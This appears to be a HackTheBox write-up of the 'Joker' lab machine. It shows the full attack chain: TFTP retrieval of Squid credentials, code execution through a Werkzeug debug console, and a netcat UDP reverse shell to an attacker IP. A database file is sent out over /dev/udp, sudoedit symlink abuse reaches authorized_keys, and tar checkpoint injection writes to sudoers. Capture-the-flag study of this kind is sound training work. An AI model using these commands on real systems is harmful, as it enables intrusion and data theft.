@@ -1,0 +1,269 @@
+---
+title: 'HTB | Joker'
+published: 2025-07-02
+draft: false
+description: 'HTB Machine `Joker` writeup.'
+tags: ['HackTheBox', 'linux']
+---
+
+# Recon
+
+## `Nmap` Scans
+
+### `TCP` Scan
+
+```text
+# Nmap 7.94SVN scan initiated Mon Jun  9 21:11:11 2025 as: nmap -sC -sV -p22,3128 -Pn -n -vv -oN nmap/tcp_deep 10.10.10.21
+Nmap scan report for 10.10.10.21
+Host is up, received user-set (0.090s latency).
+Scanned at 2025-06-09 21:11:12 IST for 16s
+
+PORT     STATE SERVICE    REASON         VERSION
+22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 7.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 88:24:e3:57:10:9f:1b:17:3d:7a:f3:26:3d:b6:33:4e (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSF43c4+2T8wvIChFBroKwvO52vc9j6UIFY1neTYtPLs/XwN+duCl6Ncxb4uzw8/tN6AH/VNBkKqVecm6oqVdj9q/qZgGIm739suj+nKMoEY8w+B3UnZTriFBnoDof3N/EPfAYbQqcMge17F1IX8HencfyVzsh8tTkmDYHnPqbuwiO4dkhCjs7zr38uHdDoYao7NbLM+EOOxECwbu8+hmUahx9hpBmvkO0lVvuLdhfOggRaQR7nOjd26SnClq+SUoGqv3eIr+jbGvngjyh1PJcoIkxuvPZWko2D3+Uem3tjZEU7IFylX7wFnsmb7kfs+m2aYIV1g89KDP7RrWAJUHD
+|   256 76:b6:f6:08:00:bd:68:ce:97:cb:08:e7:77:69:3d:8a (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLrlLfBGlkNls7ttTNUwr7+qTJaN7Nqlj2Eyo4e9NBTlwIGP2QLgNPTUF3u1XfQThwQEbQ4SrwvfQxZqdQNNygE=
+|   256 dc:91:e4:8d:d0:16:ce:cf:3d:91:82:09:23:a7:dc:86 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGI19rwyGSLg0kosaUbhH+G7JSebxhso8m559KQxqBOI
+3128/tcp open  http-proxy syn-ack ttl 63 Squid http proxy 3.5.12
+|_http-server-header: squid/3.5.12
+|_http-title: ERROR: The requested URL could not be retrieved
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Jun  9 21:11:28 2025 -- 1 IP address (1 host up) scanned in 16.45 seconds
+```
+
+- Available Ports : 22 (SSH) , 3128 (Squid Proxy)
+
+### `UDP` Scan
+
+```
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-04 07:21 EDT
+Nmap scan report for 10.10.10.21
+Host is up (0.013s latency).
+Not shown: 198 closed ports
+PORT     STATE         SERVICE
+69/udp   open|filtered tftp
+5355/udp open|filtered llmnr
+
+Nmap done: 1 IP address (1 host up) scanned in 216.90 seconds
+```
+
+- Port 69 is open and running - [[TFTP]].
+- Port 5355 is a false-positive.
+
+<hr>
+
+# Exploitation
+
+## Squid Proxy w/o credentials
+
+- Accessing the squid proxy without credentials returns an unauthorised error.
+- Nothing to do w/o credentials.
+
+## TFTP - Getting Files
+
+- With `TFTP`, we can request `Squid Proxy` configuration files.
+- We found a set of credentials in `/etc/squid/passwords` file, which we can crack and get `kalamari \ ihateseafood` .
+- Now, with these, we can access squid proxy.
+
+## Squid Proxy /w credentials
+
+- Accessing `http://<SERVER_IP>:<PORT>` or `http://localhost:<PORT>` returns `403` or `503` for every port.
+- Accessing `http://127.0.0.1:<PORT>` shows port 80 and port 58616 are open.
+
+```shell
+$ seq 1 65535 | ffuf -x http://kalamari:ihateseafood@10.10.10.21:3128 -u http://127.0.0.1:FUZZ -w - -o available_ports -fc 403
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://127.0.0.1:FUZZ
+ :: Wordlist         : FUZZ: -
+ :: Output file      : available_ports
+ :: File format      : json
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Proxy            : http://kalamari:ihateseafood@10.10.10.21:3128
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response status: 403
+________________________________________________
+
+80                      [Status: 200, Size: 899, Words: 121, Lines: 28, Duration: 814ms]
+58616                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 101ms]
+:: Progress: [65535/65535] :: Job [1/1] :: 408 req/sec :: Duration: [0:02:47] :: Errors: 1 ::
+
+```
+
+- Port 80 runs `flask` application named `Shorty` as in a `URL shortner`.
+
+## `Shorty` | Flask Application running at `127.0.0.1:80`
+
+- A directory bruteforce to this app reveals an endpoint `/console` . This endpoint is an interface to python console.
+
+## `UDP` Reverse Shell
+
+- This python console does not have any limitations, any command can be executed including system commands as well.
+- This makes this console as a dangerous security flaw.
+- `Whoami`
+
+```python
+import os
+os.getlogin()
+# 'werkzeug'
+```
+
+- Trying to get a `TCP` reverse shell fails.
+- After checking in-built firewall rules, it shows all `TCP Outbound and Ibound (except port 22 and 3128)`connections are _dropped_.
+
+```python
+with open('/etc/iptables/rules.v4', 'r') as f: print(f.read())
+# Generated by iptables-save v1.6.0 on Fri May 19 18:01:16 2017
+*filter
+:INPUT DROP [41573:1829596]
+:FORWARD ACCEPT [0:0]
+:OUTPUT ACCEPT [878:221932]
+-A INPUT -i ens33 -p tcp -m tcp --dport 22 -j ACCEPT
+-A INPUT -i ens33 -p tcp -m tcp --dport 3128 -j ACCEPT
+-A INPUT -i ens33 -p udp -j ACCEPT
+-A INPUT -i ens33 -p icmp -j ACCEPT
+-A INPUT -i lo -j ACCEPT
+-A OUTPUT -o ens33 -p tcp -m state --state NEW -j DROP
+COMMIT
+# Completed on Fri May 19 18:01:16 2017
+```
+
+- Only `UDP` outbound connections are allowed. This means I could go for a `UDP` reverse shell, or a `UDP` bind shell.
+- From `revshells.com` , 2 options are available for a `UDP Reverse Shell` , the `Bash UDP` does not work for some reason.
+- The `Ncat UDP` works. :
+
+```python
+os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u 10.10.14.25 9001 >/tmp/f").read()
+```
+
+Setting up Listener :
+
+```shell
+$ nc -lnvp 9001 -u
+```
+
+and I get a shell as `Werkzeug`.
+
+<hr>
+
+# Lateral Movement
+
+- After getting a shell as `Werkzeug` , I land in `/var/www`. I see here 3 files and directories.
+
+```shell
+$ ls -la
+manage-shorty.py shorty/ testing/
+```
+
+## Checking `shorty.db`
+
+- The `manage-shorty.py` files shows the location of the `db` file at `/var/www/shorty/shorty.db`.
+- Its unlikely that this file would contain any user data, as their was no login or register location in the app.
+- Still, to check this, I transfer it to my machine:
+
+```shell
+$ cat shorty.db > /dev/udp/10.10.14.25/9002
+```
+
+To catch this file :
+
+```shell
+$ nc -lnvp 9002 -u | tee shorty.db
+```
+
+- Now, reading this file with `sqlite3` , it only has a single table called `urls` with no entries.
+
+## `sudo -l`
+
+- Checking `sudo -l`, we have access to run `sudoedit` as `alekos` for a file located at `/var/www/*/*/layout.html`
+- Since it was a python application, my first thought was to exploit `SSTI` by injecting a reverse shell , but the file at `/var/www/shorty/templates/layout.html` was owned by `root` , and also **It won't be of any use as I would get the same shell as `Werkzeug`**.
+- I have complete access over `/var/www/testing/` directory.
+
+## `Sudoedit`
+
+- I create a symbolic link under `/var/www/testing/conner/` to `/home/alekos/.ssh/authorized_keys` names as `layout.html`
+- This satisfies the entry under `sudo -l`.
+- Now, since I have edit access for `layout.html` as `alekos`, I can edit the designated file of symbolic link `authorized_keys` as it is owned by `alekos` , and add my `public_key` to this file.
+- Finally, I can just `SSH` into the box as `alekos` using my `SSH Key`.
+
+# Privilege Escalation
+
+- The home directory of `alekos` had two folders : `development` and `backup`
+- The `backup` folder contains `.tar.gz` of the `development` folder created every 5 minutes.
+- These backups have to be created using a cron script owned by root, as all the files inside `backup` are owned by `root`.
+
+## Exploit 1 : `tar` Wildcard
+
+- `tar` has a functionality that enable to run a command after reaching every Nth record
+
+```
+ --checkpoint[=N]
+        Display progress messages every Nth record (default 10).
+```
+
+- This action can be defined using :
+
+```
+--checkpoint-action=ACTION
+             Run ACTION on each checkpoint.
+```
+
+- To exploit this, we create three files with the following names :
+  - `--checkpoint=1` : empty file, this when used with `tar` to archive will tell that it has reached a checkpoint, and now has to run the action specified by
+    `--checkpoint-action=ACTION`
+  - `--checkpoint-action=exec=sh root.sh` : another empty file, this will tell `tar` to execute `root.sh` script using `sh` after reaching checkpoint.
+  - `root.sh` : The script file that will contain our commands
+
+```shell
+echo 'echo "alekos ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
+```
+
+- After 5 minutes, a new archive using `tar` will be created, and when we use `sudo -i` , we will be dropped into `root` shell without password.
+
+## Exploit 2 : Symbolic Link
+
+- The script wants `/home/alekos/development` directory. It does not checks it contents nor it checks if its a **symbolic link** or not.
+- To exploit this behaviour, we will first move the original `development` folder to somewhere else.
+- Next, we create a symbolic link for the `/root` directory, name it as `development` and place it under `/home/alekos`.
+- Now, when the script runs, it would create a backup of the `/root` directory instead of the intended `development` folder.
+- We can extract the latest archive, and view content of its files.
+
+## Exploit 3 : Breaking Back(up script)
+
+This is what the backup `cron` script looks like :
+
+```shell
+root@joker:~$ cat backup.sh
+#!/bin/sh
+
+FILENAME="dev-$(date +%s).tar.gz"
+
+cd /home/alekos/development;
+tar cf /home/alekos/backup/$FILENAME *;
+chown root:alekos /home/alekos/backup/$FILENAME;
+chmod 640 /home/alekos/backup/$FILENAME;
+```
+
+- The script first changes directory to `/home/alekos/development`.
+- Then, it adds everything (`*`) present in the directory it currently in to the archive.
+- If there is no `development` folder, the `cd` command will fail, and the script working directory will be `/root` itself.
+- This will make the script to create a backup of the `/root` directory, which we can extract later and read content of all the files.
